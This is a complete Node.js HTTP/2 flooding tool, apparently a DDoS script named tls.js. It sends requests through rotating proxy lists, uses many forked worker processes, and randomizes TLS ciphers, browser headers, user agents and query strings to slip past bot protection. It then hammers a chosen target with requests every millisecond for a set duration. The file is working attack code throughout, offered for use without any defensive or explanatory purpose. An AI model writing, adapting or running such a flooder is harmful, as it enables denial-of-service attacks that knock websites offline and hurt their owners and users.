const net=require("net"),http2=require("http2"),tls=require("tls"),cluster=require("cluster"),{URL}=require("url"),crypto=require("crypto"),fs=require("fs"),UserAgent=require("user-agents"),colors=require('colors');process.setMaxListeners(0);require("events").EventEmitter.defaultMaxListeners=0;process.on('uncaughtException',()=>{});

if(process.argv.length<7){console.log(`Usage: node tls.js <target> <time> <rate> <thread> <proxyfile> [--verify true] [--cookie "cookie"] [--useragent "agent"]`);process.exit();}

const headers={},readLines=f=>fs.readFileSync(f,"utf-8").toString().split(/\r?\n/),randomIntn=(m,n)=>Math.floor(Math.random()*(n-m)+m),randomElement=e=>e[randomIntn(0,e.length)],randstr=l=>{let r="";for(let i=0;i<l;i++)r+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random()*62));return r};

const ip_spoof=()=>`${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,spoofed=ip_spoof(),ip_spoof1=()=>Math.floor(Math.random()*50000),spoofed1=ip_spoof1(),args={target:process.argv[2],time:parseInt(process.argv[3]),Rate:parseInt(process.argv[4]),threads:parseInt(process.argv[5]),proxyFile:process.argv[6],verifyProxy:process.argv.includes('--verify')&&process.argv[process.argv.indexOf('--verify')+1]==='true',cookie:process.argv.includes('--cookie')?process.argv[process.argv.indexOf('--cookie')+1]:null,useragent:process.argv.includes('--useragent')?process.argv[process.argv.indexOf('--useragent')+1]:null};

const sig=['ecdsa_secp256r1_sha256','ecdsa_secp384r1_sha384','ecdsa_secp521r1_sha512','rsa_pss_rsae_sha256','rsa_pss_rsae_sha384','rsa_pss_rsae_sha512','rsa_pkcs1_sha256','rsa_pkcs1_sha384','rsa_pkcs1_sha512'],sigalgs1=sig.join(':'),cplist=["ECDHE-ECDSA-AES128-GCM-SHA256","ECDHE-ECDSA-CHACHA20-POLY1305","ECDHE-RSA-AES128-GCM-SHA256","ECDHE-RSA-CHACHA20-POLY1305","ECDHE-ECDSA-AES256-GCM-SHA384","ECDHE-RSA-AES256-GCM-SHA384"],accept_header=['*/*','image/*','image/webp,image/apng','text/html','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'],lang_header=['ko-KR','en-US','zh-CN','zh-TW','ja-JP','en-GB','en-AU','en-ZA'],encoding_header=['gzip, deflate, br','deflate','gzip, deflate, lzma, sdch','deflate'],control_header=["no-cache","max-age=0"],refers=["https://www.google.com/","https://www.facebook.com/","https://www.twitter.com/","https://www.youtube.com/","https://www.linkedin.com/","https://proxyscrape.com/","https://www.instagram.com/","https://wwww.reddit.com/","https://fivem.net/","https://www.fbi.gov/","https://nettruyenplus.com/","https://vnexpress.net/","https://zalo.me","https://shopee.vn","https://www.tiktok.com/","https://google.com.vn/","https://tuoitre.vn/","https://thanhnien.vn/","https://nettruyento.com/"];const defaultCiphers=crypto.constants.defaultCoreCipherList.split(":");const ciphers1="GREASE:"+[defaultCiphers[2],defaultCiphers[1],defaultCiphers[0],...defaultCiphers.slice(3)].join(":");const uap=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"];version=['"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"','"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"'];platform=['Linux','Windows'];site=['cross-site','same-origin','same-site','none'];mode=['cors','navigate','no-cors','same-origin'];dest=['document','image','embed','empty','frame'];const rateHeaders=[{"akamai-origin-hop":randstr(12)},{"proxy-client-ip":randstr(12)},{"via":randstr(12)},{"cluster-ip":randstr(12)}];model=['Windows','Linux x86_64','AMD64'];

var cipper=cplist[Math.floor(Math.random()*cplist.length)],siga=sig[Math.floor(Math.random()*sig.length)],uap1=uap[Math.floor(Math.random()*uap.length)],ver=version[Math.floor(Math.random()*version.length)],model1=model[Math.floor(Math.random()*model.length)],platforms=platform[Math.floor(Math.random()*platform.length)],Ref=refers[Math.floor(Math.random()*refers.length)],site1=site[Math.floor(Math.random()*site.length)],mode1=mode[Math.floor(Math.random()*mode.length)],dest1=dest[Math.floor(Math.random()*dest.length)],accept=accept_header[Math.floor(Math.random()*accept_header.length)],lang=lang_header[Math.floor(Math.random()*lang_header.length)],encoding=encoding_header[Math.floor(Math.random()*encoding_header.length)],control=control_header[Math.floor(Math.random()*control_header.length)],proxies=readLines(args.proxyFile);const parsedTarget=new URL(args.target);

async function verifyProxy(p){return new Promise(r=>{if(!p||!p.trim())return r(!1);const t=p.split(':');if(t.length<2)return r(!1);const o={host:t[0],port:parseInt(t[1]),address:'www.google.com:443',timeout:5e3,auth:t.length>3?{username:t[2],password:t[3]}:null};let e="CONNECT www.google.com:443 HTTP/1.1\r\nHost: www.google.com:443\r\n";o.auth&&(e+=`Proxy-Authorization: Basic ${Buffer.from(`${o.auth.username}:${o.auth.password}`).toString('base64')}\r\n`);e+="Connection: Keep-Alive\r\n\r\n";const i=net.connect({host:o.host,port:o.port,timeout:o.timeout});i.on('connect',()=>{i.write(e)});i.on('data',e=>{const t=e.toString();/HTTP\/1.[01] 200/.test(t)?(i.end(),r(!0)):(i.end(),r(!1))});i.on('error',()=>{r(!1)});i.on('timeout',()=>{i.end(),r(!1)})})}

if(args.verifyProxy&&cluster.isMaster){console.log('[PROXY VERIFICATION] Starting proxy verification...'.yellow);(async()=>{const t=[];for(const e of proxies)try{(await verifyProxy(e))?(console.log(`[PROXY VERIFICATION] ${e}`.green+' -> LIVE'.green),t.push(e)):console.log(`[PROXY VERIFICATION] ${e}`.red+' -> DIE'.red)}catch(e){console.log(`[PROXY VERIFICATION] ${e}`.red+' -> DIE'.red)}proxies=t;console.log(`[PROXY VERIFICATION] Completed. ${t.length}/${proxies.length} proxies are live.`.yellow);if(0===t.length){console.log('[!] No live proxies found, exiting...'.red);process.exit(1)}})()}

if(cluster.isMaster)for(let e=1;e<=args.threads;e++)cluster.fork();else setInterval(runFlooder,1)

class NetSocket{constructor(){}HTTP(e,t){const o=e.address.split(":"),n=o[0],r="CONNECT "+e.address+" HTTP/1.1\r\nHost: "+e.address+"\r\n"+(e.auth?`Proxy-Authorization: Basic ${Buffer.from(`${e.auth.username}:${e.auth.password}`).toString('base64')}\r\n`:"")+"Connection: Keep-Alive\r\n\r\n",i=new Buffer.from(r),s=net.connect({host:e.host,port:e.port,timeout:1e3*e.timeout});s.setTimeout(1e3*e.timeout);s.setKeepAlive(!0,1e5);s.on("connect",()=>{s.write(i)});s.on("data",e=>{const o=e.toString("utf-8");/HTTP\/1.[01] 200/.test(o)?t(s,void 0):(s.destroy(),t(void 0,"error: invalid response from proxy server"))});s.on("timeout",()=>{s.destroy(),t(void 0,"error: timeout exceeded")});s.on("error",e=>{s.destroy(),t(void 0,"error: "+e)})}}

const userAgents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.3","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51"],randomUserAgent=userAgents[Math.floor(Math.random()*userAgents.length)],userAgent=new UserAgent,Socker=new NetSocket;

headers[":method"]="GET";headers[":authority"]=parsedTarget.host;headers[":path"]=parsedTarget.pathname+"?"+randstr(10)+"="+randstr(5);headers[":scheme"]="https";headers.origin="https://iruko.org/cdn-cgi/trace";headers["sec-ch-ua"]=ver;headers["sec-ch-ua-platform"]="Windows";headers["sec-ch-ua-mobile"]="?0";headers["accept-encoding"]=encoding;headers["accept-language"]=lang;headers["user-agent"]=args.useragent||randstr(25);headers["upgrade-insecure-requests"]="1";headers.accept=accept;headers["sec-fetch-mode"]="navigate";headers["sec-fetch-dest"]="document";headers["sec-fetch-site"]="same-origin";headers.TE="trailers";headers["sec-fetch-user"]="?1";headers["x-requested-with"]="XMLHttpRequest";args.cookie&&(headers.cookie=args.cookie);

function runFlooder(){const e=randomElement(proxies);if(!e||!e.trim())return;const t=e.split(":"),o={host:t[0],port:~~t[1],address:parsedTarget.host+":443",timeout:300,auth:t.length>3?{username:t[2],password:t[3]}:null};Socker.HTTP(o,(t,o)=>{if(o)return;t.setKeepAlive(!0,2e5);const n={secure:!0,ALPNProtocols:['h2'],sigals:siga,socket:t,ciphers:cipper,ecdhCurve:"prime256v1:secp384r1:secp521r1",host:parsedTarget.host,rejectUnauthorized:!1,servername:parsedTarget.host,secureProtocol:"TLS_method"},r=tls.connect(443,parsedTarget.host,n);r.setKeepAlive(!0,6e4);const i=http2.connect(parsedTarget.href,{protocol:"https:",settings:{headerTableSize:65536,maxConcurrentStreams:1e4,initialWindowSize:6291456,maxHeaderListSize:65536,enablePush:!1},maxSessionMemory:64e3,maxDeflateDynamicTableSize:4294967295,createConnection:()=>r,socket:t});i.settings({headerTableSize:65536,maxConcurrentStreams:1e4,initialWindowSize:6291456,maxHeaderListSize:65536,enablePush:!1});i.on("connect",()=>{const o=setInterval(()=>{const n={...headers,...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]};for(let t=0;t<args.Rate;t++){const o=i.request(n);o.on("response",t=>{console.log(`[+] ${args.target} Proxy: ${e} ${t[':status']}`);o.close();o.destroy()});o.end()}},1)});i.on("close",()=>{i.destroy();t.destroy()})})}

const KillScript=()=>process.exit(1);setTimeout(KillScript,1e3*args.time);